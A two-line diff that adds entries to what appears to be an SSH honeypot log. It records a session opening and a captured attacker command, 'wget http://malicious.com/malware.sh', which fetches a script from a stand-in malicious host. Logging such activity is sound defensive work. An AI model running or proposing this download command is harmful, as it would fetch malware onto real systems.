@@ -1,0 +1,2 @@
+2025-06-29T10:22:33+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,123.45.67.89] Opening TTY log
+2025-06-29T10:22:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,123.45.67.89] Command found: wget http://malicious.com/malware.sh
